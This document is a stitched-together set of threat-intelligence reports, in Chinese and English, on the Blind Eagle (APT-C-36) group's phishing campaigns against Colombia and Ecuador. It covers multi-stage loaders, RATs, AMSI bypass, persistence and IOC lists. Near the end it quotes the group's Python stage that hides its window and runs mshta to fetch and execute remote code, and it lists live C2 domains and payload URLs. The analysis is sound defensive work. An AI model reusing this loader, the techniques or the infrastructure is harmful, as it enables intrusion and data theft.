360高级威胁研究院是360政企安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑。盲眼鹰（ 奇安 信内部组织编 号APT-Q-98 ）是奇安信独立发现并率先披露的APT组织。盲眼鹰组织是一个疑似来自南美洲的、主要针对哥伦比亚的APT组织，该组织自2018年4月起至今，针对哥伦比亚政府机构和大型公司（金融、石油、制造等行业）等重要领域展开了有组织、有计划、针对性的长期不间断攻击 [1] 。 由于19世纪和20世纪欧洲，中东和亚洲的迁徙浪潮，导致哥伦比亚是一个非常多元化的国家。在1980年代和1990年代，该国经历了打击毒品贩运的战争，谋杀率与犯罪率极高，21世纪初以来该国虽然稍微改善了生活品质与安全，但至今仍为毒品、毒贩、毒品种植的核心所在地，治安依旧败坏，为世界上最危险的国家之一。伴随着政治意见的不同、殖民经济、社会动乱等环境因素，针对性的情报窃取攻击广泛存在，这类APT攻击持续性强，针对性明确，隐蔽性高，应该时刻保持关注。
近日，奇安信威胁情报中心红雨滴团队在日常的威胁狩猎中捕获到了盲眼鹰的攻击活动样本。在此攻击活动中，盲眼鹰组织的感染链与之前的攻击活动保持相对一致，使用诱饵PDF作为入口点，诱导受害者点击短链接下载压缩包，解压后点击执行伪装为pdf的VBS脚本，从而开启一个复杂的多阶段无文件感染链。经研判，本次攻击活动的特点如下：
使用鱼叉钓鱼作为攻击入口，附件为pdf诱饵，诱导下载包含密码的压缩包，以此来躲避邮件检测系统的查杀；
多阶段无文件内存加载，降低杀软的检出率；
伪装成哥伦比亚国家司法部门，使用西班牙语的诱饵文档，最终加载njRAT，符合盲眼鹰的TTP；
文件类型 Pdf
点击执行后展示的页面如下，其文件内容伪造成西班牙语中最大的就业网络公司computrabajo发的扣押通知书，语言为西班牙语，符合盲眼鹰组织攻击目标特征 [2] 。文件内容大体是提示受害者会费违约，无法联系客户，将扣押资产。文件提供了核实文档的链接，以及查看密码5051。当鼠标放在链接上，可以看到，实际为一短链接。
点击短链接后，将下载一名为Embargo Judicial RAD 254-1548.pdf.rar的压缩包回来，压缩包中包含双后缀的vbs文件，并在文件名中提示解压密码为5051。
上述powershell脚本先从C2：185.136.171.110下载cursodll.txt，经base64解码后调用其UDsSiDbb函数执行，并将powershell中的第二个URL链接作为参数传入。cursodll.txt内容如下所示：
UDsSiDbb函数的主要功能是下载上述powershell中的第二个URL链接，解码后保存在局部变量text3中，然后通过第三个URL链接下载新的后续来执行，其URL链接翻转后为：http://185.136.171.110/p/cursope.txt，下载回来后解码调用其zzGvtpbo函数，并将微软RegSvcs.exe程序路径以及局部变量text3作为参数传入。
zzGvtpbo函数实际为注入器，创建傀儡进程RegSvcs.exe，将阶段二下载保存在text3中的内容进行注入，经分析，注入的文件实际为njRAT，这与盲眼鹰之前的TTP相吻合。
njRAT是jRAT的变体，也被称为Bladabindi；它是一种远程访问木马，用于远程控制受感染的机器。由于其可用性和技术，njRAT是世界上使用最广泛的RAT之一。njRAT木马建立在.NET框架之上，这种RAT使黑客能够远程控制受害者的PC。njRAT允许攻击者激活网络摄像头、记录按键并从网络浏览器中窃取密码。此外，Bladabindi让黑客可以访问受感染机器上的命令行。它允许攻击者杀死进程以及远程执行和操作文件。最重要的是，njRAT能够操纵系统注册表。当PC被感染时，njRAT会收集包括计算机名称、操作系统编号、计算机所在国家、用户名和操作系统版本等信息。 本次捕获的njRAT主要包含以下几种功能：
• 操控文件
• 下载文件执行
• 截屏
• 自更新
• 自删除
• 操作系统注册表
• 记录按键
• 更新C2配置信息
其访问的C2为wins10.duckdns.org，端口为57831。
奇安信威胁情报中心对此次捕获样本攻击手法，代码逻辑层面分析，发现此次捕获的攻击样本与盲眼鹰组织常用TTP基本一致。其中njRAT中的IP地址所在地为哥伦比亚，之前盲眼鹰使用的所有IP地址均归属于哥伦比亚，与该组织早期活动的IP地理位置相同。
诱饵文档的文件名称都是西班牙语，而且尝试伪装的信息、意图攻击的目标都与之前盲眼鹰的目标一致。我们通过在样本库中关联分析发现。在2022年2月25日，盲眼鹰组织伪装成哥伦比亚国家司法部门（www.fiscalia.gov.co）进行进行鱼叉钓鱼攻击。
盲眼鹰组织是一直活跃在南美洲地区APT团伙，擅于使用钓鱼攻击，而且他们并不会在暴露后更改他们的攻击技战法或者数字武器，而是通过保持更新来使攻击活动尽可能的高效。 钓鱼邮件是APT攻击入口的重要手段，大多数用户安全意识不强，很容易被伪装邮件以及伪装的文档、欺骗性标题所迷惑。奇安信红雨滴团队提醒广大用户，谨防钓鱼攻击，切勿打开社交媒体分享的来历不明的链接，不点击执行未知来源的邮件附件，不运行标题夸张的未知文件，不安装非正规途径来源的APP。做到及时备份重要文件，更新安装补丁。 若需运行，安装来历不明的应用，可先通过奇安信威胁情报文件深度分析平台（https://sandbox.ti.qianxin.com/sandbox/page）进行判别。目前已支持包括Windows、安卓平台在内的多种格式文件深度分析。 目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。
136D2A0C5F1F2A8B8BAF583D06DE6E85 E161D0119E58A42469EEDC018E8E61E6 43CC42AA63006E0200C011B72884EFD5 87FDB37D3AF229E98C9B4C0F86E97D7F 000BB96BD620E55EA6A358AF4BCB418B 28125694EF9C9C9C6CC68B34FF289C9C
URL http://185.136.171.110/dll/cursodll.txt http://185.136.171.110/p/cursope.txt http://91.241.19.49/test/new/WX1.txt
C2 wins10.duckdns.org:57831 febenvi.duckdns.org:2050
[1]. https://ti.qianxin.com/apt/detail/5c6b61fc596a100017f5890a?name=%E7%9B%B2%E7%9C%BC%E9%B9%B0&type=map [2]. https://ti.qianxin.com/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations/360威胁情报中心是全球领先的威胁情报共享、分析和预警平台，依托360安全大脑百亿级样本，万亿级防护日志等海量安全数据，整合360漏洞挖掘、恶意代码分析、威胁情报追踪等团队的安全能力，产出高质量的安全威胁情报，驱动安全的防御、检测和响应。
APT-C-36 （盲眼鹰 ），是一个疑似来自南美洲的、主要针对哥伦比亚的APT组织，该组织自2018年持续发起针对哥伦比亚的攻击活动。近期， 360高级威胁研究院监测到了多次该组织针对哥伦比亚国家发起的钓鱼邮件定向攻击，通过样本内部解密算法关联，我们判断两次行动都归属于盲眼鹰组织，在这两次攻击行动中，样本都经过层层解密释放，加大了传统查杀的难度。
APT-C-36经常使用鱼叉攻击，通过伪装成政府部门对受害者发送钓鱼邮件，报告中涉及的两次行动都采用了邮件投递第一阶段的载荷。第一次行动伪装DHL包裹投递，主题使用出货通知单来迷惑中招目标；第二次投递伪装成政府邮件，发送伪装成pdf文件的恶意文档。盲眼鹰一直对哥伦比亚的政府部门保持高度的关注，自身也会伪装成相关部门进行邮件投递，同时仿冒政府网站进行钓鱼攻击。
1.2 Loader
LE-8726PDC . exe 会进行三次自解密，得到最终的可执行文件，获取受害者主机信息，使用的邮件客户端和浏览器的 Cookies/cookies.sqlite 文件的窃密，并会每隔20min上传屏幕截图以及键盘击键记录到C 2 。
LE-8726PDC . ex e对硬编码的数据使用ba se64 解码后获得第二层PE文件 OpenAsyncRetry 。
OpenAsyncRetry 解密 LE-8726PDC . exe 的资源文件之后获得第三层PE文件。
解密算法如下：
我们之前捕获该组织样本，把可执行文件的加载器伪装成pdf文件。
诱使用户点击后执行，解密释放内部存储的pe文件，进行下一阶段的攻击。文件内部隐藏的解密密钥与解密算法如下：
2.2 Loader
通过创建进程并传入参数命令行后，启动Loader进程继续解密资源节中隐藏的PE文件。
继续释放内部存储的PE文件，先解密内部隐藏的密钥，最后的解密算法为模16，释放最终的样本木马。这与我们之前监控到的攻击行动解密算法完全相同。
首先从文件自身资源中提取PE文件。
利用密钥异或进行第一次解密操作。
进行模16并异或运算解密出最终的后门文件，此处的模16并异或运算与上次行动的算法对比完全相同。
最后释放的是AsyncRAT，asyncRat远控不仅包括通讯、守护、隐藏、自启动等常见功能模块，而且还包含加密、反沙盒、反虚拟机、反分析、反调试等对抗模块，是一款相对比较成熟的异步通讯开源木马。
主要功能如下：
窃取浏览器中保存的密码
开启摄像头
代码片段：
拉丁美洲本身包含复杂的国家组成、地域跨度、文化习俗，其左翼力量近些年持续上升，进而影响南美洲的政治局势。哥伦比亚作为美国的战略合作伙伴因为一直在拉美地区通过自己的地位和影响力帮助美国实现全球战略以及后花园稳定，被其他政治意见不同的国家时刻紧盯。伴随着南美洲的各个国家的动乱，以及政治意见的不同，针对性的情报窃取攻击广泛存在，这类 APT攻击持续性强，针对性明确，即使被安全厂商披露，也不会停止行动潜伏，应该时刻保持关注。
钓鱼邮件是 APT攻击入口的重要手段，大多数用户安全意识不强，很容易被伪装邮件以及伪装的文档、欺骗性标题所迷惑，在毫无防范的情况下被攻陷 。
D7D4C0D46DE2910E6473E622F048EDC6
1E4AE7FF1FD387F6A54DCE49BDBE6C4B
758bd85a96463059b93327a36b3869b9
julian.linkpc.net
128.90.115.36
360 高级威胁研究院
360高级威胁研究院是360政企安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑。
不看此公众号
写留言 取消 留言 我的留言 写留言 正在加载 展开我的留言 以上留言被精选后，将对所有人可见 精选留言 写留言 写留言 正在加载 已无更多数据 发消息 关闭 写留言 提交 更多 正在加载 表情 正在加载 留言Overview
The following report provides the TTPs,and IOCs identified in a malware campaign impersonating the “Fiscalía General de la Nación” from Colombia. Our research team identified this campaign through threat hunting on public sources.
The group behind this campaign is APT-C-36, also know as Blind Eagle. Most TTPs coincide with previous campaigns attributed to this cybercriminal group in public investigations.
SCILabs was unable to identify the initial attack vector; however, we determined with high confidence that as in the previous campaigns, the attackers are distributing the malware through phishing emails with a PDF document attached. We make this hypothesis based on the TTPs that we observed in previous campaigns of this threat group.
Like the previous campaign, the cybercriminals continue using njRAT . As it is known, this kind of trojans has similar capabilities like stealing credentials stored in browsers, opening a reverse shell, uploading and downloading files, as well as a password stealer and a keylogger among others.
Based on the TTPs identified and the capabilities identified in the malware used by the attackers, the objective of this campaign is the theft of user information in Colombia.
How could it affect an organization?
The attackers mainly target users in Colombia; the attacker’s goal is implant a backdoor to control the target computer and provide the basis for lateral moves and other types of attacks related to the theft of sensitive information, which can cause financial and reputational losses in the affected companies.
Analysis
Threat Context
SCILabs recovered a PDF file through threat hunting in public sources; the file includes a hyperlink to the One Drive servers, which leads to the download of a password-protected BZ2-type compressed file with a .vbs file inside. The password is inside the PDF file.
The .vbs file downloads a text file that contains a PowerShell encoded script to perform the following operations:
Decode FunWithAMSI library to Bypass Microsoft AMSI (Windows Antimalware Scan Interface)
Save the njRAT payload to the Windows registry
Generate the necessary files to obtain persistence
Execute the last file to complete the infection by injecting the njRAT trojan into the aspnet_compiler.exe
Technical Summary
The APT-C-36 group initial access method commonly is phishing emails impersonating various organizations, mainly in Colombia in this case. SCILabs could only retrieve the PDF file attached to the phishing email impersonating the “Fiscalía General de la Nación” from Colombia.
The PDF file contains a URL that leads to a password protected .bz2 file downloaded from legitimate One Drive servers. The .bz2file contains a Visual BasicScript.
The attacker uses a fileless technique using the .vbs script to download from Discord servers a text file that contains base64 encoded PowerShell instructions to perform the following actions:
Decode FunWithAMSI library to Bypass Microsoft AMSI (Windows Antimalware Scan Interface)
Save the njRAT payload to the Windows registry default value in key HKCU:\software\wow6432node\Microsoft\WindowsUpdate
Generate the following files to obtain persistence and end the infection chain:
SystemLogin.bat : Encoded batch file to execute the last stage of infection through the System Binary Proxy Execution technique via mshta utility and PowerShell sentence. This file is dropped in the %AppData%\Roaming folder
Login1.vbs : Visual Basic Script dropped in Windows Startup folder to generate persistence and execute the SystemLogin.bat file
myScript.ps1 : Encoded PowerShell Script dropped in Windows %PUBLIC% folder to generate persistence and execute the SystemLogin.bat file . This file contains a njRAT injector, the encoded FunWithAMSI DLL, the AES Everywhere library to decrypt the njRAT payload, and the statements to inject the trojan into the legitimate aspnet_compiler.exe executable.
Finally, the aspnet_compiler.exe executable found in the C:\Windows\Microsoft.NET\Framework\v4.0.30319 directory is used to inject the njRAT trojan and begin communication with the C2 domain( 1204abril[.]duckdns[.]org[:]2001 ).
It is important to mention that, in general, the TTPs of the previous investigations continue to be maintained; however, SCILabs identified that the adversary is using Visual Basic Script files as the first dropper instead of JavaScriptfiles.
Diamond Model
Below we show the diamond model observed during the investigation.
Overlaps between APT-C-36 previous campaignsand this campaign(key indicators)
To determine that the adversary of the previous campaigns and the currents are the same, SCILabs used the “rule of 2 ”which says that to determine that two threats are the same, there must be overlaps in at least two vertices of the diamond model. Here is the result of applying this rule:
Adversary
APT-C-36 previous campaigns / APT-C-36 current campaign
Password protected compressed file to distribute the first dropper.
Adversary
APT-C-36 previous campaigns / APT-C-36 current campaign
PDF file for the victim to download the first stage of infection chain.
According to public investigations, related emails used to attack the Colombian government, financial institutions and large companies have been found.
Previous campaigns: Colombian users and organizations
Current campaigns: Users in Colombia
Adversary
APT-C-36 previous campaigns / APT-C-36 current campaign
Based on public research and the TTPs observed by SCILabs, the adversaries use JavaScript, Visual Basic Script, and PowerShell for the different stages of infection.
Infrastructure
Development of artifacts using scripting languages like Visual Basic Script, PowerShell, and JavaScript. Additionally, the use of commodity RATs like njRAT
Victim
Previous campaigns: Colombian users and organizations Current campaigns: Users in Colombia
Adversary
APT-C-36 previous campaigns / APT-C-36 current campaign
Attackers often download encrypted text files from external systems containing embedded artifacts such as commodity RATs or DLL injectors to deploy the malware.
Previous campaigns: Colombian users and organizations
Current campaigns: Users in Colombia
Adversary
APT-C-36 previous campaigns / APT-C-36 current campaign
Attackers uses non-standard ports to their c2 servers.
Previous campaigns: Colombian users and organizations
Current campaigns: Users in Colombia
Adversary
APT-C-36 previous campaigns / APT-C-36 current campaign
Adversaries use obfuscated code throughout the infection chain, using plain text files as the primary means of storing payloads and commands.
They often use base64 algorithms and replacement of letters or special characters in obfuscated payloads.
Previous campaigns: Colombian users and organizations
Current campaigns: Users in Colombia
Adversary
APT-C-36 previous campaigns / APT-C-36 current campaign
Attackers have used the commodity RAT njRAT.
Previous campaigns: Colombian users and organizations
Current campaigns: Users in Colombia
Adversary
APT-C-36 previous campaigns / APT-C-36 current campaign
The attackers use a .vbs script in the Windows Startup folder to generate persistence.
Previous campaigns: Colombian users and organizations
Current campaigns: Users in Colombia
Adversary
APT-C-36 previous campaigns / APT-C-36 current campaign
In recent campaigns, adversaries have used domains from the Duckdns service via the HTTP protocol to communicate with the c2 server.
Previous campaigns: Colombian users and organizations
Current campaigns: Users in Colombia
In this exercise, the overlaps between the infrastructure vertices and capabilities/TTPs of the diamond model can be observed, complying with the rule of 2 and supporting that the adversary behind this campaign is probably APT-C-36 . SCILabs will continue to monitor these campaigns to obtain more elements that allow raising the level of certainty of the attribution.
TTPs observed aligned to MITRE’s ATT&CK framework
Assessment
The APT-C-36 threat group is characterized by using commodity RATs such as njRAT; however, SCILabs has identified that the artifacts used during the infection chain have a shallow detection rate by commercial antivirus solutions. Additionally, they are constantly adjusting their artifacts, such as using .vbs files instead of JavaScript files and using different PDF templates or pretexts in their emails to evade the anti-spam protections.
This adversary employs fileless and living off the land techniques, uses legitimate servers like OneDrive and Discord to store malicious artifacts, and various obfuscation and encryption algorithms. This can make it difficult for security solutions to identify malicious behavior easily; for this reason, it is important for organizations to perform threat hunting on organizations’ endpoints and workstations considering directories, registry keys, and executables as those mentioned in this report.
These characteristics make this adversary a focus of attention because SCILabs considers that attackers could begin to consider in the future attacking victims in other countries such as Mexico in all kinds of organizations. Therefore, for SCILabs it is important that organizations are up to date on the TTPs used by this adversary and that could be copied by other cybercriminal groups to carry out more destructive attacks.
We believe that the ideal victims of this type of campaign are the organizations that do not pay special attention to behavioral indicators and that do not know in detail the stages of the infection chain of this type of attack. SCILabs believes that this adversary will continue to use commodity RATs and will continue to target LATAM; however, based on our telemetry, cybercriminals will continue to modify their artifacts to improve their effectiveness.
386CEAFDE6870930B4C0C0FAF3274A7A
C86433C0F61D1DF61208B2CFCA02543F
F967C869142E3242BFCA0E9C38CDD6FD
324DB54A7DF625B2CBF6B75E9EFEC140
2BB9168601ED09F975041B3E5593A764
889BDEAF65D152BEC9512A768B73CB5A
08FBA67E620C5AF2C4738EAB767A78D5
HXXPS[:]//ONEDRIVE[.]LIVE[.]COM/DOWNLOAD?CID=7F3ACF9F2D72D5A5&RESID=7F3ACF9F2D72D5A5%21827&AUTHKEY=AMZ2CWHP91GKHCI
HXXPS[:]//CDN[.]DISCORDAPP[.]COM/ATTACHMENTS/911673301896691753/976527856819646504/MIO18MAYOMIO[.]TXT
1204ABRIL[.]DUCKDNS[.]ORG[:]2001
ABRIL[.]DUCKDNS[.]ORGAPT-C-36（盲眼鹰）是一个疑似来自南美洲的APT组织，主要目标位于哥伦比亚境内，以及南美的一些地区，如厄瓜多尔和巴拿马。该组织自2018年被发现以来，持续发起针对哥伦比亚国家的政府部门、金融、保险等行业以及大型公司的定向攻击。
APT-C-36近期常采用鱼叉攻击，以PDF文件作为入口点，诱导用户点击文档里面的恶意链接下载RAR压缩包文件。大部分压缩包文件需要密码才能解压，密码基本为4位纯数字，解压后是伪装成PDF文件名的VBS脚本。VBS脚本被用户点击执行后将开启一段复杂多阶段的无文件攻击链，最终加载程序为混淆过的AsyncRAT或NjRAT木马，并且加入了绕过AMSI机制的代码，这都表明该组织在不断优化其攻击武器。
一、攻击活动分析 1.攻击流程分析 上图显示了本次攻击的部分载荷完整攻击流程。攻击者诱导用户下载恶意压缩包文件，执行其中的VBS脚本，内存加载远端下载的第一阶段DLL，该DLL继续内存加载第二阶段DLL。为了隐藏最终恶意代码，第二阶段DLL会将AsyncRAT或者NjRAT木马注入到傀儡进程RegAsm或AppLaunch.exe中执行。最后加载的木马程序与C2服务器建立通信，以实现远控功能。需要注意的是，攻击者为了攻击载荷下载不被拦截，常使用邮件服务器或者文本存储服务的网站（如Paste.ee）进行载荷保存。
2.载荷投递分析 本次捕获的样本多为压缩包文件，部分样本需要4位纯数字密码进行解压缩，解压后的文件功能类似。
下面以其中一个恶意样本文件为例，详细介绍其攻击链。
Radicado%20%231-2022-028101_8002465216546165465651_265465165465165a6654ff564216165ca1654215648984461ca894364614846489a489498165489498489ff89419849815564pdf.RAR
1.42KB
8d8b7131bdf067e3d9c3abff9ee74ad8
该文件为一个RAR压缩包文件，文件里面含有一个和RAR文件同名的VBS文件，并且文件名长度很长，后缀为pdf.rar，这样用户在不注意的情况下很容易点击从而中招。 此外，VBS文件内容充满了大量无用数据及混淆的恶意代码，可以很明显的看到“Updated”字样，可以推测攻击活动发生在2022年9月15日后。
去混淆得到关键代码如下：
恶意代码从地址 https://contadoreshbc.com/dll_startup下载 编码的DLL数据，调用Fiber.Home.VAI方法，实现反射加载DLL，并传入参数,参数为URL反序（URL：https://mail.cmconcretos.com/home/cartera@cmconcretos.com/Briefcase/prueba4.txt?disp=a&ver=1），以此作为第一阶段加载器。
3.攻击组件分析
第一阶段DLL
（MD5：8061f477cfa49c8d2f2aa7cc19e3d09d）
VAI方法首先将自身移动到%ProgramData%目录，并命名为Done.VBS,然后从 https://schoolcrypter.com/Rump 下载文件，替换指定字符串并解码得到第二阶段DLL文件。接着调用第二阶段DLL的Fsociety.Tools.Ande方法，参数为“C:\\Windows\\Microsoft.NET\\Framework \\v4.0.30319 \\RegAsm.exe ”（被注入程序）和最终恶意代码（从VBS脚本传入的远端链接参数下载并解码的数据）。
第二阶段DLL
（MD5：3c929b58ba69cee4e5e8714b4b3d7e12）
该阶段通过创建RegAsm.exe进程，向其注入下载的恶意载荷，以此达到隐藏进程的目的。下图是一些注入操作需要的API。
最终加载的载荷
（MD5：6969d415553f93d9bd39fc93dc6cfbda）
根据分析，我们发现最终载荷是一款经过二次开发，并且使用SmartAssembly混淆过的AsyncRAT远控木马。AsyncRAT是一款使用C#语言编写的开源远控木马程序，其功能包含进程监控、文件管理、远程桌面、键盘记录等多项远控功能，还包含反虚拟机、反调试、反沙箱等多种对抗技术。
当载荷被执行之后，首先调用Settings.InitializeSettings加载配置信息，通过Base64解码取得Key，然后利用AES算法解密获取端口(Ports)、主机(Host)、版本(Version)、Install，MTX，Anti等重要配置信息。
f4oSLQzdggENogxPNffih0wzw4FRQAtv
Ports
Hosts
strekhost2043.duckdns.org
Version
0.5.7B
Install
FALSE
cookiesdat
Pastebin
FALSE
FALSE
Group
Default
F610C7F4363913D3C16E
根据配置文件的Anti属性，决定是否检测环境，主要检测Vmware和VirtualBox虚拟机，反调试，沙箱，硬盘容量，是否是XP系统。
判断PasteBin是否为空，如果为空，则从配置信息中取出主机信息(域名/IP)和端口，检测主机的有效性，之后进行连接。如果PasteBin不为空，则以“：”为分隔符，分别取主机信息和端口进行连接。由此可见，该RAT的C2具有很强的拓展性和灵活性。
当客户端和服务端建立了SSL连接之后，通过调用IdSender.SendInfo()方法收集被控机器的HWID(硬件号)、User（用户名）、OS等主机信息。
此外，远控木马程序包含多个功能模块，主要包括文件管理、文件搜索、键盘记录、进程管理、远程桌面、远程摄像头等。这些功能单独以模块存在，并不存在于客户端程序，按照所需要的功能，将不同的模块发送到客户端，在客户端执行对应的功能。
Chat.dll
Extra.dll
弹窗，访问Url，关闭Defedner等
FileManager.dll
FileSearcher.dll
LimeLogger.dll
Miscellaneous.dll
USB,DOS,torrent,Shell，DotNet代码执行
Options.dll
退出，重启，reportWindow
ProcessManager.dll
Recovery.dll
RemoteCamera.dll
RemoteDesktop.dll
SendFile.dll
SendMemory.dll
需要特别注意的是，在分析其他攻击组件时，我们发现了部分AsyncRAT载荷加入了绕过AMSI的代码，主要是通过HOOK amsi.dll中AmsiScanBuffer函数，让其返回一个正常结果，从而绕过检测让其恶意程序正常执行。
二、关联分析 本次攻击样本跟今年上半年我们捕获到的攻击样本具有很高的相似性，都属于APT-C-36组织，上半年发现的攻击载荷信息如下：
multas transito-jpg.bz2
9.09KB
1511dcd31e221764c10875186cf47a93
该样本为RAR类型，从http://tiny.cc/5pkquz下载获取。解压时需要密码,与本次发现的部分样本（MD5: a15236e342b18306c76dfbe6cf8f7966）很类似。
解压后为VBS脚本，该脚本大致的执行流程与本次攻击流程基本类似，也是采用多阶段加载最终开源RAT的方式。不同在于第一阶段的DLL由本地解密得到，并不是从远端加载，此外还有最终注入开源木马NjRAT。
另外需要说明的是，其RAR解压密码和下载链接常通过PDF伪装文档提供。如下图所示，诱导受害者点击实为恶意短链接（http://tiny.cc/5pkquz）的网址下载RAR压缩包文件，并提醒压缩包密码为2022，诱导用户打开恶意文件。
结合到APT-C-36组织以前投递方法，完全有理由相信本次载荷的投递也是通过此类文档诱惑用户点击下载压缩包，遗憾的是本次并未完全关联到相关诱饵文件。
此外，在本次样本溯源分析中时发现了一处该组织托管在cmconcretos.com邮件服务器上的恶意程序，这些程序在2022年9月22日前后上传，并且在不断更新，表明攻击时间就发生在此阶段。
服务器里面的RAR压缩包也基本需要密码（4位纯数字）才能打开，同时文件名带有西班牙语，解压后也为带有PDF字样的长文件名VBS脚本。通过分析，在其中一个压缩包中我们发现了某下载链接为https://paste.ee/d/amsfg/0，表明恶意代码放在paste.ee平台，该组织曾将恶意代码托管到pastebin平台，区别在于前者不受限制地使用。另外该邮箱服务器以及C2基本都位于哥伦比亚地区，以及部分样本来源显示为哥伦比亚，再结合样本整个攻击链，都符合为APT-C-36组织攻击特点和目标。综上，我们有理由将其归属到APT-C-36（盲眼鹰）组织。
APT-C-36（盲眼鹰）组织长期针对哥伦比亚及周边国家进行攻击，并且将部分恶意代码托管到公共服务平台如paste.ee及邮件服务器上，以便隐藏攻击痕迹。同时为了应对不断进步的安全防御检测系统，该组织对多种不同类型的开源木马（如NjRAT和SyncRAT）进行魔改、混淆等来达到不同的场景需求，此次攻击中采用的木马经过SmartAssembly混淆，且部分载荷加入了绕过AMSI机制的代码，这都表明该组织在持续地更新恶意代码的功能和形态，并呈现出功能化、模块化的特点。
此外，本文披露的相关恶意代码和C2只是APT-C-36（盲眼鹰）组织部分攻击过程中使用的最新武器，后期我们也将持续关注该组织的攻击活动。
1511dcd31e221764c10875186cf47a93
2c308999644f67da2eb7ff7e6dda3252
0a1a29adc5efc66c80495dfce4c8dccd
f3b69760423a929d74d10e9deee83c78
8d8b7131bdf067e3d9c3abff9ee74ad8
518a1bd0764ca25fcf36d8a55bf2ebd9
1940c300ca7b58111756a431469d842c
a15236e342b18306c76dfbe6cf8f7966
09cc69be85e107c207234cdc76dcd09a
3c929b58ba69cee4e5e8714b4b3d7e12
813a7ce57c2c93c06aff32d74cbd5b7a
6cd9fb0bc54e7a885c1d3feef4a8e2de
6969d415553f93d9bd39fc93dc6cfbda
adfca35b0e78cb2442ee03ae971ab672
https://contadoreshbc[.]com/dll_startup
https://mail.cmconcretos[.]com/home/cartera@cmconcretos.com/Briefcase/prueba4.txt?disp=a&ver=1
https://schoolcrypter[.]com/Rump
https://schoolcrypter[.]com/rump_2
https://paste[.]ee/d/amsfg/0
http://20.106.232[.]4/rumpe/FOTOOOOOOOOOOOOOOOO.jpg
https://cdn.discordapp [ . ] com/attachments/958218348804587533/963037127979958332/1988ENVIOS.txt
Domain:
remcosos.duckdns.org:1988
strekhost2043.duckdns.org:4203
strekhost2043.duckdns.org:4205
360 高级威胁研究院
360高级威胁研究院是360政企安全集团的核心能力支持部门，由360资深安全专家组成，专注于高级威胁的发现、防御、处置和研究，曾在全球范围内率先捕获双杀、双星、噩梦公式等多起业界知名的0day在野攻击，独家披露多个国家级APT组织的高级行动，赢得业内外的广泛认可，为360保障国家网络安全提供有力支撑。APT-C-36, also known as Blind Eagle, is a financially motivated threat group that has been launching indiscriminate attacks against citizens of various countries in South America since at least 2018.
In a recent campaign targeting Ecuador based organizations, CPR detected a new infection chain that involves a more advanced toolset.
The backdoor chosen for this campaign is typically used by espionage campaigns, which is unusual for this group
ACTIVE CAMPAIGNS AGAINST COLOMBIAN TARGETS
For the last few months, we have been observing the ongoing campaigns orchestrated by Blind Eagle, which have mostly adhered to the TTPs described above — phishing emails pretending to be from the Colombian government. One typical example is an email purportedly from the Ministry of Foreign Affairs, threatening the recipient with issues when leaving the country unless they settle a bureaucratic matter.
Such emails usually feature either a malicious document or a malicious link, but in this case, the attackers said “why not both?” and included both a link and a terse attached PDF directing the unfortunate victim to the exact same link.
In both cases, the link in question consists of a legitimate link-shortening service URL that geolocates victims and makes them communicate with a different “server” depending on the original country (). If the incoming HTTP request originates from outside Colombia, the server aborts the infection chain, acts innocent and redirects the client to the official website of the migration department of the Colombian Ministry of Foreign Affairs. https://gtly[.]to/QvlFV_zgh
If the incoming request seems to arrive from Colombia, the infection chain proceeds as scheduled. The server responds to the client with a file for download. This is a malware executable hosted on the file-sharing service MediaFire. The file is compressed, similar to a ZIP file, using the LHA algorithm . It is password-protected, making it impervious against naive static analysis and even naive sandbox emulation. The password is found both in the email and in the attached PDF.
The malicious executable inside the LHA is written in .Net and packed. When unpacked, a modified sample of QuasarRAT is revealed.
QuasarRAT is an open source trojan available in multiple sources like Github. The (probably Spanish-speaking) actors behind this APT group have added some extra capabilities over the last few years, which are easy to spot due to the names of functions and variables in Spanish. This process, by which threat actors abuse access to malware sources and each create their own special versions of that malware, is sadly not without precedent in the security landscape and always makes us heave a sad sigh when we encounter it .
Although QuasarRAT is not a dedicated banking Trojan, it can be observed from the sample’s embedded strings that the group’s main goal in the campaign was to intercept victim access to their bank account.
This is a complete list of targeted entities:
Bancolombia Sucursal Virtual Personas
Sucursal_Virtual_Empresas_
Portal Empresarial Davivienda
BBVA Net Cash
Colpatria – Banca Empresas
bancaempresas.bancocajasocial.com
Empresarial Banco de Bogota
conexionenlinea.bancodebogota.com
AV Villas – Banca Empresarial
Bancoomeva Banca Empresarial
TRANSUNION
Banco Popular
portalpymes
Blockchain
DashboardDavivienda
Some extra features added to Quasar by this group are a function named “ActivarRDP” (activate RDP) and two more to activate and deactivate the system Proxy:
Along with a few more commands that incur technical debt by impudently disregarding Quasar’s convention for function name and parameter order:
A BETTER CAMPAIGN FEATURING NEWER TOOLS
One specific sample caught our attention as it was related to a government institution from Ecuador and not from Colombia. While Blind Eagle attacking Ecuador is not unprecedented, it is still unusual. Similarly to the campaign described above, the geo-filter server in this campaign redirects requests outside of Ecuador and Colombia to the website of the Ecuadorian Internal Revenue Service:
If contacted from Colombia or Ecuador, the downloaded file from Mediafire will be a RAR archive with a password. But instead of a single executable consisting of some packed RAT, the infection chain, in this case, is much more elaborate:
Inside the RAR archive, there is an executable built with PyInstaller with a rather simplistic Python 3.10 code. This code just adds a new stage in the infection chain:
import os import subprocess import ctypes ctypes. windll . user32 . ShowWindow ( ctypes. windll . kernel32 . GetConsoleWindow () , 0 ) wsx = 'mshta <https://gtly> [.] to/dGBeBqd8z' os. system ( wsx ) import os
import subprocess
import ctypes
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
wsx = 'mshta <https://gtly> [.] to/dGBeBqd8z'
os.system(wsx) import os
import subprocess
import ctypes
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
wsx = 'mshta <https://gtly> [.] to/dGBeBqd8z'
os.system(wsx)
mshta is a utility that executes Microsoft HTML Applications, and the attackers abuse it here to download and execute the next stage, which contains VBS code embedded in an HTML.
